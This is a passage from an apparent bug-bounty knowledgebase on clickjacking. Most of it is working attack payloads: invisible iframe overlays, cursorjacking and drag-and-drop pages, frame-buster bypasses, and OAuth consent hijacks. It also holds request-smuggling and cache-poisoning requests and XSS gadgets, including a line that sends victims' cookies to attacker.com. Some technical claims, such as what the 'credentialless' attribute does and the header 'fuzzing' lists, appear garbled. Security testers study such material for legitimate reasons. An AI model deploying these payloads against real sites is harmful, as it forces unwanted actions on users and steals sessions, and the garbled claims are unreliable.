# Clickjacking Advanced Knowledgebase
## A Research-Grade Compilation for Bug Bounty Hunting & Black-Box Testing

> **Version:** 2026-05-24  
> **Sources:** PortSwigger Web Security Academy, PayloadsAllTheThings, HackTricks, MDN, GitHub Security Research, James Kettle's Research (PortSwigger), Frans Rosén, and numerous bug bounty writeups  
> **Classification:** Advanced UI Redressing & Clickjacking Techniques

---

## Table of Contents

1. [Basics](#1-basics)
2. [Clickjacking Theory](#2-clickjacking-theory)
3. [UI Redressing Internals](#3-ui-redressing-internals)
4. [Clickjacking Payloads](#4-clickjacking-payloads)
5. [Drag-and-Drop Clickjacking](#5-drag-and-drop-clickjacking)
6. [Cursorjacking Payloads](#6-cursorjacking-payloads)
7. [Frame-Buster Bypasses](#7-frame-buster-bypasses)
8. [Multi-Step Clickjacking Attacks](#8-multi-step-clickjacking-attacks)
9. [OAuth Consent Clickjacking Chains](#9-oauth-consent-clickjacking-chains)
10. [DOM XSS + Clickjacking Chains](#10-dom-xss--clickjacking-chains)
11. [Cache Poisoning + Clickjacking Chains](#11-cache-poisoning--clickjacking-chains)
12. [Request Smuggling + Clickjacking Chains](#12-request-smuggling--clickjacking-chains)
13. [postMessage + Clickjacking Chains](#13-postmessage--clickjacking-chains)
14. [Parser Confusion Payloads](#14-parser-confusion-payloads)
15. [Browser Quirks](#15-browser-quirks)
16. [Gadget Chains](#16-gadget-chains)
17. [Real World Case Studies](#17-real-world-case-studies)
18. [Fuzzing Payloads](#18-fuzzing-payloads)
19. [Automation Workflows](#19-automation-workflows)
20. [Recon Methodology](#20-recon-methodology)
21. [Nuclei Templates](#21-nuclei-templates)
22. [Tools and Scanners](#22-tools-and-scanners)
23. [Advanced Research](#23-advanced-research)
24. [Bug Bounty Writeups](#24-bug-bounty-writeups)
25. [Payload Collections](#25-payload-collections)
26. [WAF Bypasses](#26-waf-bypasses)
27. [Detection Techniques](#27-detection-techniques)
28. [References](#28-references)

---

## 1. Basics

### What is Clickjacking?

Clickjacking (UI Redressing) is an interface-based attack where a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. The technique depends upon the incorporation of an invisible, actionable web page (or multiple pages) containing a button or hidden link within an `<iframe>`. The iframe is overlaid on top of the user's anticipated decoy web page content.

**Key distinction from CSRF:** Clickjacking requires the user to perform an action such as a button click, whereas CSRF depends upon forging an entire request without the user's knowledge or input. CSRF tokens do NOT mitigate clickjacking because a target session is established with content loaded from an authentic website and all requests happen on-domain.

### Core Requirements

| Requirement | Description |
|-------------|-------------|
| Frameability | Target page must be embeddable in an iframe (no `X-Frame-Options` or `CSP frame-ancestors`) |
| Actionable Element | Target must have a clickable element that performs a state-changing action |
| User Interaction | Victim must be tricked into interacting with the decoy overlay |

### Defense Headers Overview

```http
# X-Frame-Options (Legacy but still effective)
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://trusted.com  # Deprecated, not supported in Chrome/Safari

# Content-Security-Policy (Modern standard)
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self';
Content-Security-Policy: frame-ancestors https://example.com https://trusted.com;
```

**Critical Notes:**
- `X-Frame-Options` inside `<meta>` elements has NO effect. Must be HTTP header only.
- `frame-ancestors` is NOT supported in `<meta>` tags.
- If both headers are present, `frame-ancestors` takes precedence in modern browsers.
- `frame-ancestors` does NOT fall back to `default-src`.

---

## 2. Clickjacking Theory

### The Overlay Model

```
┌─────────────────────────────────────────┐
│  DECOY WEBSITE (visible to user)        │
│  ┌─────────────────────────────────┐    │
│  │  "Click here to win a prize!"  │    │
│  │         [ BUTTON ]              │    │
│  └─────────────────────────────────┘    │
│                                         │
│  ╔═════════════════════════════════════╗ │
│  ║ TARGET IFRAME (opacity: 0.0001)    ║ │
│  ║ ┌───────────────────────────────┐  ║ │
│  ║ │  [Delete Account]             │  ║ │
│  ║ │  [Transfer $10,000]           │  ║ │
│  ║ └───────────────────────────────┘  ║ │
│  ╚═════════════════════════════════════╝ │
└─────────────────────────────────────────┘
```

### CSS Layering Mechanics

The attacker uses CSS to create and manipulate layers:

```html
<head>
    <style>
        #target_website {
            position: relative;
            width: 128px;
            height: 128px;
            opacity: 0.00001;  /* Near-transparent */
            z-index: 2;        /* On top of decoy */
        }
        #decoy_website {
            position: absolute;
            width: 300px;
            height: 400px;
            z-index: 1;        /* Below target */
        }
    </style>
</head>
<body>
    <div id="decoy_website">
        ...decoy web content here...
    </div>
    <iframe id="target_website" src="https://vulnerable-website.com">
    </iframe>
</body>
```

### Positioning Strategy

| Property | Purpose |
|----------|---------|
| `position: absolute/relative` | Ensures precise overlap regardless of screen size |
| `z-index` | Determines stacking order of layers |
| `opacity: 0.0 - 0.0001` | Makes iframe transparent; threshold detection varies by browser |
| `width/height` | Match target button dimensions |
| `top/left` | Fine-tune alignment with decoy element |

**Browser Transparency Thresholds:**
- Chrome 76+: Includes threshold-based iframe transparency detection
- Firefox: Does NOT include this behavior (more permissive)
- Safari: Varies by version

---

## 3. UI Redressing Internals

### UI Redressing Attack Flow

1. **Overlay Creation:** Attacker creates a transparent HTML element covering the entire viewport
2. **Positioning:** CSS properties position the overlay to cover the target element precisely
3. **Misleading Interaction:** Deceptive elements within the transparent container trick user interaction
4. **Action Execution:** User unknowingly interacts with hidden elements

### Invisible Frames Technique

```html
<!-- Hidden iframe with zero dimensions -->
<iframe src="malicious-site" 
        style="opacity: 0; height: 0; width: 0; border: none;">
</iframe>

<!-- Or positioned off-screen -->
<iframe src="target-site" 
        style="position: absolute; top: -9999px; left: -9999px;">
</iframe>
```

### Button/Form Hijacking Pattern

```html
<!-- Visible decoy button -->
<button onclick="submitForm()">Click me to continue</button>

<!-- Hidden form targeting victim site -->
<form action="https://victim.com/transfer" method="POST" id="hidden-form" style="display: none;">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="10000">
</form>

<script>
    function submitForm() {
        document.getElementById('hidden-form').submit();
    }
</script>
```

### Prefilled Form Input Clickjacking

Some websites permit prepopulation of form inputs using GET parameters. The attacker modifies the target URL to incorporate chosen values:

```html
<iframe src="https://victim.com/transfer?to=attacker&amount=10000"
        style="opacity: 0.0001; position: absolute; z-index: 2;">
</iframe>
```

---

## 4. Clickjacking Payloads

### Basic Clickjacking Payload

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        iframe {
            position: relative;
            width: 500px;
            height: 700px;
            opacity: 0.0001;
            z-index: 2;
        }
        div {
            position: absolute;
            top: 300px;
            left: 60px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div>Click me</div>
    <iframe src="https://target.com/sensitive-action"></iframe>
</body>
</html>
```

### CSRF-Protected Endpoint Payload

```html
<!-- Even with CSRF tokens, clickjacking works because the session is legitimate -->
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://target.com/my-account?action=delete"></iframe>
```

### Opacity Calibration Payload

```html
<!-- Use opacity: 0.1 for alignment, then switch to 0.0001 for attack -->
<style>
    #target {
        opacity: 0.1;  /* Visible for alignment */
        position: relative;
        width: 500px;
        height: 700px;
        z-index: 2;
    }
</style>
<!-- Adjust top/left until cursor changes to hand, then reduce opacity -->
```

### Full-Screen Overlay Payload

```html
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
    <a href="malicious-link" style="display: block; width: 100%; height: 100%;">
        Click me
    </a>
</div>
```

### Sandbox-Neutralized Frame Buster Payload

```html
<!-- When target has frame-busting JavaScript -->
<iframe id="victim_website" 
        src="https://victim-website.com" 
        sandbox="allow-forms allow-scripts">
</iframe>
<!-- sandbox without allow-top-navigation neutralizes frame busters -->
```

---

## 5. Drag-and-Drop Clickjacking

### Theory

Drag-and-drop clickjacking tricks users into dragging and dropping elements across iframe boundaries, potentially:
- Uploading malicious files
- Moving sensitive data
- Reordering elements to bypass security checks
- Triggering actions that require drag gestures

### Drag-and-Drop Payload

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        #target-iframe {
            position: absolute;
            top: 50px;
            left: 50px;
            width: 400px;
            height: 400px;
            opacity: 0.0001;
            z-index: 2;
        }
        #decoy-dropzone {
            position: absolute;
            top: 50px;
            left: 50px;
            width: 400px;
            height: 400px;
            border: 2px dashed #ccc;
            z-index: 1;
        }
        #draggable {
            position: absolute;
            top: 500px;
            left: 50px;
            width: 100px;
            height: 100px;
            background: #4CAF50;
            color: white;
            text-align: center;
            line-height: 100px;
            cursor: move;
            z-index: 3;
        }
    </style>
</head>
<body>
    <div id="decoy-dropzone">Drop file here</div>
    <div id="draggable" draggable="true">Drag me</div>
    <iframe id="target-iframe" src="https://target.com/upload-zone"></iframe>

    <script>
        const draggable = document.getElementById('draggable');
        const iframe = document.getElementById('target-iframe');

        draggable.addEventListener('dragstart', (e) => {
            e.dataTransfer.setData('text/plain', 'malicious-payload');
        });
    </script>
</body>
</html>
```

### File Upload Drag-and-Drop

```html
<!-- Trick user into dropping a file onto an invisible upload zone -->
<style>
    .upload-target {
        position: absolute;
        top: 100px;
        left: 100px;
        width: 300px;
        height: 200px;
        opacity: 0.0001;
        z-index: 2;
    }
    .fake-zone {
        position: absolute;
        top: 100px;
        left: 100px;
        width: 300px;
        height: 200px;
        border: 3px dashed #007bff;
        background: #f0f8ff;
        z-index: 1;
    }
</style>
<div class="fake-zone">Drop your file here to scan it</div>
<iframe class="upload-target" src="https://target.com/profile/avatar-upload"></iframe>
```

---

## 6. Cursorjacking Payloads

### Theory

Cursorjacking manipulates the user's cursor position using CSS or JavaScript, making the user click on a different location than where they perceive the cursor to be.

### CSS Cursor Offset Technique

```html
<style>
    body {
        cursor: none;  /* Hide real cursor */
    }
    #fake-cursor {
        position: fixed;
        width: 20px;
        height: 20px;
        background: url('cursor.png');
        pointer-events: none;
        z-index: 9999;
        /* Offset the fake cursor from real position */
        transform: translate(-50px, -50px);
    }
    #target-iframe {
        position: absolute;
        top: 100px;
        left: 100px;
        opacity: 0.0001;
        z-index: 2;
    }
    #decoy {
        position: absolute;
        top: 150px;
        left: 150px;
        z-index: 1;
    }
</style>
<div id="fake-cursor"></div>
<div id="decoy">Click here!</div>
<iframe id="target-iframe" src="https://target.com/dangerous-action"></iframe>

<script>
    document.addEventListener('mousemove', (e) => {
        const cursor = document.getElementById('fake-cursor');
        cursor.style.left = e.clientX + 'px';
        cursor.style.top = e.clientY + 'px';
    });
</script>
```

### JavaScript Cursor Position Manipulation

```html
<script>
    // Move the actual cursor using pointer-lock API
    document.body.requestPointerLock = document.body.requestPointerLock ||
                                       document.body.mozRequestPointerLock;

    document.addEventListener('click', () => {
        document.body.requestPointerLock();
    });

    document.addEventListener('mousemove', (e) => {
        if (document.pointerLockElement === document.body) {
            // Cursor is locked; user cannot see real position
            // Movement events still fire but cursor is hidden/controlled
        }
    });
</script>
```

---

## 7. Frame-Buster Bypasses

### Understanding Frame Busters

Frame-busting scripts typically:
1. Check if `window === top` (current window is main window)
2. Make all frames visible
3. Prevent clicking on invisible frames
4. Intercept and flag potential clickjacking attacks

### Bypass 1: HTML5 Sandbox Attribute

```html
<!-- The most reliable frame-buster bypass -->
<iframe src="https://victim-website.com" 
        sandbox="allow-forms allow-scripts">
</iframe>
```

**Why it works:**
- `allow-forms` and `allow-scripts` permit functionality within the iframe
- Omitting `allow-top-navigation` prevents the frame buster from checking `window.top` or navigating the top window
- The iframe cannot determine if it is the top window

### Bypass 2: onBeforeUnload Event

```html
<!-- Cancel frame-busting navigation attempts -->
<script>
    window.onbeforeunload = function() {
        return "Do you want to leave this page?";
    };
</script>
<iframe src="https://target.com"></iframe>
```

**Enhanced version (no user prompt):**

```html
<!-- 204 No Content loop to cancel navigation -->
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() {
        prevent_bust++;
    };
    setInterval(function() {
        if (prevent_bust > 0) {
            prevent_bust -= 2;
            window.top.location = "https://attacker.com/204.php";
        }
    }, 1);
</script>
<iframe src="https://target.com"></iframe>
```

```php
<?php
// 204.php - Returns No Content to cancel navigation
header("HTTP/1.1 204 No Content");
?>
```

### Bypass 3: XSS Filter Induced Frame Buster Disable

**IE8 XSS Filter:**
```html
<!-- Induce false positive to disable inline scripts including frame busters -->
<iframe src="https://target.com/?param=<script>if">
</iframe>
```

**Chrome XSSAuditor Filter:**
```html
<!-- Pass frame-busting code in parameter to disable specific script -->
<iframe src="https://target.com/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D">
</iframe>
```

### Bypass 4: Double Framing

```html
<iframe src="middle.html" style="opacity: 0;"></iframe>

<!-- middle.html contains: -->
<iframe src="https://target.com"></iframe>
```

Some frame busters fail when nested inside another iframe because `top.location` checks behave differently.

### Bypass 5: Restricted Frames (IE)

```html
<!-- IE "restricted" security attribute disables JavaScript in frame -->
<iframe src="http://target.com" security="restricted"></iframe>
```

### Bypass 6: Sandbox + allow-same-origin Trick

```html
<!-- When target uses document.domain checks -->
<iframe src="https://target.com" 
        sandbox="allow-scripts allow-same-origin">
</iframe>
```

**Warning:** Using both `allow-scripts` and `allow-same-origin` on same-origin content lets the embedded document remove the sandbox attribute entirely.

### Bypass 7: CORS + Credential Stripping

```html
<iframe src="https://target.com" 
        sandbox="allow-scripts"
        credentialless="true">
</iframe>
```

The `credentialless` attribute loads content in a new ephemeral context without access to network, cookies, or storage.

---

## 8. Multi-Step Clickjacking Attacks

### Theory

Attacker manipulation may require multiple actions (e.g., add to cart → checkout → confirm). These are implemented using multiple divisions or iframes with precise timing.

### Two-Step Clickjacking Payload

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    .firstClick, .secondClick {
        position: absolute;
        top: 330px;
        left: 50px;
        z-index: 1;
    }
    .secondClick {
        top: 285px;
        left: 225px;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://target.com/my-account"></iframe>
```

### Multi-Step with JavaScript Timing

```html
<script>
    let step = 0;
    const steps = [
        { top: '330px', left: '50px', text: 'Step 1: Click here' },
        { top: '285px', left: '225px', text: 'Step 2: Confirm' },
        { top: '400px', left: '100px', text: 'Step 3: Finalize' }
    ];

    function advanceStep() {
        const btn = document.getElementById('decoy-btn');
        step++;
        if (step < steps.length) {
            btn.style.top = steps[step].top;
            btn.style.left = steps[step].left;
            btn.textContent = steps[step].text;
        }
    }

    document.getElementById('decoy-btn').addEventListener('click', advanceStep);
</script>
```

### Shopping Cart Multi-Step Chain

```html
<!-- Step 1: Add item to cart -->
<!-- Step 2: Proceed to checkout -->
<!-- Step 3: Confirm payment -->
<style>
    #stage1 { position: absolute; top: 200px; left: 100px; z-index: 1; }
    #stage2 { position: absolute; top: 300px; left: 150px; z-index: 1; display: none; }
    #stage3 { position: absolute; top: 400px; left: 200px; z-index: 1; display: none; }
    iframe { position: relative; opacity: 0.0001; z-index: 2; width: 800px; height: 600px; }
</style>

<div id="stage1" onclick="showStage(2)">Add to Cart</div>
<div id="stage2" onclick="showStage(3)">Checkout</div>
<div id="stage3">Place Order</div>
<iframe src="https://shop.com/product?id=123"></iframe>

<script>
    function showStage(n) {
        document.getElementById('stage' + n).style.display = 'block';
    }
</script>
```

---

## 9. OAuth Consent Clickjacking Chains

### Theory

OAuth authorization endpoints are prime clickjacking targets because:
1. They often lack `X-Frame-Options` or CSP frame-ancestors
2. Users are trained to click "Authorize" quickly
3. The consent screen has predictable UI elements
4. Attackers can pre-select scopes via URL parameters

### OAuth Authorization Clickjacking

```html
<style>
    iframe {
        position: relative;
        width: 600px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    #authorize-btn {
        position: absolute;
        top: 450px;
        left: 200px;
        padding: 15px 30px;
        background: #28a745;
        color: white;
        border-radius: 5px;
        z-index: 1;
        cursor: pointer;
    }
</style>

<div id="authorize-btn">Continue to Free Download</div>
<iframe src="https://oauth-provider.com/authorize?
    response_type=code
    &client_id=LEGIT_CLIENT
    &redirect_uri=https://attacker.com/callback
    &scope=email+profile+read_write
    &state=csrf-token">
</iframe>
```

### OAuth Scope Escalation via Clickjacking

```html
<!-- Pre-select dangerous scopes in the iframe URL -->
<iframe src="https://provider.com/oauth/authorize?
    client_id=victim-app
    &response_type=token
    &scope=admin+delete+write+read
    &redirect_uri=https://legit-app.com/callback">
</iframe>
```

### OAuth Consent Screen Timing Attack

```html
<script>
    // Auto-click after a delay when consent screen loads
    setTimeout(() => {
        // The decoy button is positioned over the "Authorize" button
        document.getElementById('decoy').click();
    }, 2000);
</script>
```

### Hidden OAuth Attack Vectors (from PortSwigger Research)

**Dynamic Client Registration SSRF:**
```http
POST /connect/register HTTP/1.1
Content-Type: application/json
Host: oauth-server.com

{
    "application_type": "web",
    "redirect_uris": ["https://attacker.com/callback"],
    "client_name": "My App",
    "logo_uri": "https://attacker.com/logo.png",
    "jwks_uri": "https://attacker.com/keys.jwks",
    "sector_identifier_uri": "https://attacker.com/uris.json",
    "request_uris": ["https://attacker.com/request.jwt"]
}
```

**redirect_uri Session Poisoning:**
```
1. User visits attacker page
2. Page redirects to OAuth auth with TRUSTED client_id
3. Background request sends UNTRUSTED client_id (poisons session)
4. User approves first page → token leaked to attacker's redirect_uri
```

**WebFinger User Enumeration:**
```http
GET /.well-known/webfinger?
    resource=http://x/admin&
    rel=http://openid.net/specs/connect/1.0/issuer HTTP/1.1
```

---

## 10. DOM XSS + Clickjacking Chains

### Theory

Clickjacking serves as a carrier for DOM XSS attacks. The XSS exploit is combined with the iframe target URL so that user clicks execute the DOM XSS payload.

### DOM XSS + Clickjacking Payload

```html
<!-- Target has DOM XSS in URL hash or parameter -->
<iframe src="https://target.com/page#<img src=x onerror=alert(document.domain)>">
</iframe>

<!-- Or with click-triggered DOM XSS -->
<iframe src="https://target.com/search?q=<script>alert(1)</script>">
</iframe>
```

### Self-XSS Escalation via Clickjacking

```html
<!-- Self-XSS requires user interaction; clickjacking provides it -->
<iframe src="https://target.com/profile?name=<script>fetch('https://attacker.com/?c='+document.cookie)</script>">
</iframe>
```

### postMessage-based DOM XSS Chain

```html
<script>
    // Target iframe receives postMessage and executes DOM XSS
    window.addEventListener('message', (e) => {
        if (e.origin === 'https://target.com') {
            // Send malicious postMessage to trigger XSS in target
            document.querySelector('iframe').contentWindow.postMessage(
                { action: 'setName', value: '<img src=x onerror=alert(1)>' },
                '*'
            );
        }
    });
</script>
<iframe src="https://target.com/widget"></iframe>
```

---

## 11. Cache Poisoning + Clickjacking Chains

### Theory

Web cache poisoning can make clickjacking attacks persistent and widespread. By poisoning cache entries, the attacker can:
- Make XSS payloads stored in cache (affecting all visitors)
- Poison JavaScript/CSS resources to execute code in victim context
- Inject malicious redirects via cache

### Cache Poisoning → Stored Clickjacking

```http
# Poison the cache with a response that enables framing
GET /dashboard HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps

# Response gets cached with redirect to attacker.com
# All subsequent visitors get redirected
```

### Cache Key Injection for Clickjacking

```http
# Akamai cache key injection
GET /page?x=2 HTTP/1.1
Origin: '-alert(1)-'__

# Followed by:
GET /page?x=2__Origin='-alert(1)-' HTTP/1.1
# Same cache key, different response - XSS stored in cache
```

### Fat GET Cache Poisoning for Clickjacking

```http
# Poison cache with body parameters (not in cache key)
GET /profile HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

action=delete&confirm=true
```

### Web Cache Entanglement for UI Redressing

```http
# Unkeyed query string poisoning
GET //?"><script>alert(1)</script> HTTP/1.1
Host: target.com

# Cache key: https://target.com//
# Response contains XSS, served to all visitors of //
```

---

## 12. Request Smuggling + Clickjacking Chains

### Theory

HTTP Request Smuggling can bypass clickjacking protections by:
- Smuggling headers that disable frame protections
- Poisoning connections to inject framing-enabling responses
- Bypassing WAFs that block clickjacking probes

### Client-Side Desync (CSD) for Clickjacking

```javascript
// Browser-powered desync to poison victim's connection
fetch('https://target.com/favicon.ico', {
    method: 'POST',
    body: "GET / HTTP/1.1
X-Frame-Options: ALLOWALL

",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://target.com/';
});
```

### CL.0 Desync + Clickjacking

```http
# Back-end ignores Content-Length
POST /static/file HTTP/1.1
Host: target.com
Content-Length: 50

GET /admin HTTP/1.1
X-Frame-Options: ALLOWALL
Foo: bar
```

### H2.TE Downgrade + Frame Options Bypass

```http
# HTTP/2 to HTTP/1.1 downgrade smuggling
:method: POST
:path: /
:authority: target.com
content-length: 0
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Frame-Options: ALLOWALL
```

---

## 13. postMessage + Clickjacking Chains

### Theory

postMessage vulnerabilities combined with clickjacking allow:
- Sending malicious messages to framed windows
- Stealing data via postMessage without origin validation
- Triggering actions in embedded widgets

### postMessage Clickjacking Payload

```html
<iframe id="target" src="https://target.com/embed"></iframe>
<script>
    setTimeout(() => {
        const iframe = document.getElementById('target');
        // Send postMessage to trigger action in target
        iframe.contentWindow.postMessage(
            { type: 'click', target: 'delete-btn' },
            '*'  // No origin check on target = exploitable
        );
    }, 3000);
</script>
```

### postMessage Origin Bypass via Clickjacking

```html
<!-- Target checks event.origin but we frame it from expected origin -->
<script>
    // Open target in popup from attacker domain
    const win = window.open('https://target.com/oauth');

    setTimeout(() => {
        // postMessage from attacker origin but target accepts it
        win.postMessage(
            { action: 'authorize', client_id: 'attacker' },
            'https://target.com'
        );
    }, 2000);
</script>
```

### postMessage Tracker Usage

```javascript
// Use postMessage-tracker Chrome extension to find listeners
// Look for:
// - Missing origin checks
// - Weak origin validation (endsWith, indexOf)
// - Wildcard (*) targetOrigin in postMessage calls
// - JSON.parse without validation
```

---

## 14. Parser Confusion Payloads

### URL Parser Confusion

```html
<!-- Different parsers interpret URLs differently -->
<iframe src="https://target.com@attacker.com/legit-path">
</iframe>

<!-- Path confusion -->
<iframe src="https://target.com/../admin">
</iframe>

<!-- Unicode normalization confusion -->
<iframe src="https://target.com/admin%c0%af">
</iframe>
```

### Host Header Confusion

```http
# Multiple Host headers
GET / HTTP/1.1
Host: target.com
Host: attacker.com

# Space-prefixed Host
GET / HTTP/1.1
 Host: attacker.com
Host: target.com

# Host with port and @
GET / HTTP/1.1
Host: target.com:80@attacker.com
```

### Content-Type Parser Confusion

```http
# Confusing MIME type parsers
Content-Type: text/html; charset=utf-8;
Content-Type: application/json

# Boundary injection
Content-Type: multipart/form-data; boundary="x
X-Frame-Options: ALLOWALL
--x"
```

---

## 15. Browser Quirks

### Chrome Behavior

| Quirk | Impact |
|-------|--------|
| Threshold-based iframe transparency detection (v76+) | Opacity must be > 0 to avoid detection |
| Two separate connection pools (with/without cookies) | CSD attacks need `credentials: 'include'` |
| Prefers HTTP/2 | CSD attacks may fail if target supports HTTP/2 |
| CORS error on redirect | Can be used to stop redirect following in CSD |
| Stack-response discarding | Excess response data causes connection drop |

### Firefox Behavior

| Quirk | Impact |
|-------|--------|
| No iframe transparency threshold | More permissive for clickjacking |
| Different X-Frame-Options handling | `ALLOW-FROM` partially supported |
| Cookie partitioning | Affects cache poisoning reliability |

### Safari Behavior

| Quirk | Impact |
|-------|--------|
| HSTS cache auto-upgrade | HTTP redirects upgraded to HTTPS (bypasses mixed-content) |
| Different sandbox handling | Some sandbox combinations behave differently |
| ITP (Intelligent Tracking Prevention) | Affects cross-site cookie behavior |

### Edge Behavior

| Quirk | Impact |
|-------|--------|
| Mixed-content bypass on 302 | 302 redirect to HTTPS bypasses mixed-content blocking |
| Different CSP enforcement | Some CSP directives enforced differently |

### Internet Explorer Legacy

```html
<!-- IE restricted attribute -->
<iframe src="http://target.com" security="restricted"></iframe>

<!-- IE XSS filter disables frame busters -->
<iframe src="http://target.com/?param=<script>if"></iframe>
```

---

## 16. Gadget Chains

### Prototype Pollution Gadgets for Clickjacking

```javascript
// jQuery gadgets that can be triggered via clickjacking
// After prototype pollution:

// jQuery $.get XSS
?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script

// jQuery $(html) XSS  
?__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror=alert(1)>

// Google reCAPTCHA
?__proto__[srcdoc][]=<script>alert(1)</script>

// Vue.js gadgets
?__proto__[v-if]=_c.constructor('alert(1)')()
?__proto__[template]=<script>alert(1)</script>
```

### postMessage Gadgets

```javascript
// Gadgets found via postMessage-tracker:
// 1. Missing origin validation
window.addEventListener('message', (e) => {
    // No origin check!
    eval(e.data);  // Direct XSS
});

// 2. Weak origin check
if (e.origin.indexOf('target.com') !== -1) {
    // Bypass with attacker-target.com
}

// 3. JSON.parse without schema validation
const data = JSON.parse(e.data);
// data can contain arbitrary properties
```

### Cache Poisoning Gadgets

```javascript
// JavaScript resource poisoning
// Target: /api/config reflects Host header
// Poison: X-Forwarded-Host: attacker.com
// Result: All users load config from attacker.com

// CSS import poisoning
// Target: /style.css?version=1.0 reflects version
// Poison: version=a);@import url(//attacker.com/malicious.css);/*
```

---

## 17. Real World Case Studies

### Case Study 1: Facebook "Like" Clickjacking (Historical)

- **Target:** Facebook Like buttons
- **Technique:** Invisible iframe overlay on decoy content
- **Impact:** Mass forced likes
- **Mitigation:** Facebook implemented X-Frame-Options and clickjacking detection

### Case Study 2: Amazon Shopping List Desync (James Kettle)

- **Technique:** H2.0 desync on amazon.com
- **Attack:** Stored victim requests (including auth tokens) in attacker's shopping list
- **Impact:** Complete account takeover potential
- **Root Cause:** Amazon ignored Content-Length on /b/ endpoints

### Case Study 3: Akamai CDN Cache Poisoning

- **Technique:** Cache key injection via Akamai's delimiter handling
- **Impact:** XSS on every page of affected websites
- **Method:** Crafted requests with same cache key but different semantic meaning

### Case Study 4: Cisco Web VPN Client-Side Desync

- **Technique:** Client-side cache poisoning via CSD
- **Attack:** Poisoned JS cache to execute attacker code in VPN context
- **Method:** Host-header redirect gadget + cache poisoning

### Case Study 5: OAuth redirect_uri Session Poisoning (MITREid Connect)

- **CVE:** CVE-2021-27582
- **Technique:** Mass assignment on confirmation page
- **Impact:** Token leakage to arbitrary redirect_uri
- **Root Cause:** @ModelAttribute took parameters from current HTTP request

---

## 18. Fuzzing Payloads

### Header Fuzzing for Clickjacking

```
X-Frame-Options: 
X-Frame-Options: NONE
X-Frame-Options: none
X-Frame-Options: allow
X-Frame-Options: ALLOW
X-Frame-Options: sameorigin
X-Frame-Options: SAMEORIGIN
X-Frame-Options: deny
X-Frame-Options: DENY
X-Frame-Options: allow-from *
X-Frame-Options: allow-from https://attacker.com
X-Frame-Options: 
X-Frame-Options: ;
```

### CSP frame-ancestors Fuzzing

```
Content-Security-Policy: frame-ancestors *
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
Content-Security-Policy: frame-ancestors 'self' *
Content-Security-Policy: frame-ancestors https://attacker.com
Content-Security-Policy: frame-ancestors 'self' https://attacker.com
Content-Security-Policy: frame-ancestors 'none' https://attacker.com
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
```

### iframe Attribute Fuzzing

```html
<iframe sandbox="">
<iframe sandbox="allow-forms">
<iframe sandbox="allow-scripts">
<iframe sandbox="allow-same-origin">
<iframe sandbox="allow-top-navigation">
<iframe sandbox="allow-popups">
<iframe sandbox="allow-popups-to-escape-sandbox">
<iframe sandbox="allow-forms allow-scripts allow-same-origin">
<iframe sandbox="allow-forms allow-scripts" credentialless>
<iframe sandbox="allow-forms allow-scripts" csp="default-src 'none'">
```

---

## 19. Automation Workflows

### Recon Automation Pipeline

```bash
# Step 1: Subdomain enumeration
subfinder -d target.com -o subs.txt

# Step 2: HTTP probing with frame header detection
httpx -l subs.txt -H "X-Frame-Options: CHECK" -status-code -title -tech-detect

# Step 3: Screenshot for visual confirmation
cat subs.txt | aquatone -out screenshots/

# Step 4: Frameability check
cat subs.txt | while read url; do
    headers=$(curl -sI "$url" | grep -iE "x-frame-options|content-security-policy")
    if [ -z "$headers" ]; then
        echo "FRAMEABLE: $url"
    fi
done
```

### Nuclei Automation

```bash
# Run clickjacking templates
nuclei -l targets.txt -t http/vulnerabilities/clickjacking/

# Full scan with all relevant templates
nuclei -l targets.txt     -t http/vulnerabilities/clickjacking/     -t http/misconfiguration/x-frame-options.yaml     -t http/misconfiguration/content-security-policy.yaml
```

### Burp Suite Automation

```python
# Burp Extension snippet for clickjacking detection
from burp import IBurpExtender, IHttpListener

class ClickjackingDetector(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Clickjacking Detector")
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            response = messageInfo.getResponse()
            analyzed = self._helpers.analyzeResponse(response)
            headers = analyzed.getHeaders()

            has_xfo = any(h.lower().startswith('x-frame-options:') for h in headers)
            has_csp = any('frame-ancestors' in h.lower() for h in headers)

            if not has_xfo and not has_csp:
                url = self._helpers.analyzeRequest(messageInfo).getUrl()
                print("POTENTIALLY FRAMEABLE: " + str(url))
```

---

## 20. Recon Methodology

### Phase 1: Frameability Assessment

1. **Header Analysis:**
   - Check for `X-Frame-Options` header
   - Check for `Content-Security-Policy: frame-ancestors`
   - Check for missing headers entirely

2. **Direct Framing Test:**
   ```html
   <iframe src="https://target.com"></iframe>
   ```
   - If loads → frameable
   - If blocked → check console for specific error

3. **Meta Tag Check:**
   ```html
   <!-- Look for these in page source (INEFFECTIVE but common mistake) -->
   <meta http-equiv="X-Frame-Options" content="deny">
   ```

### Phase 2: Actionable Element Discovery

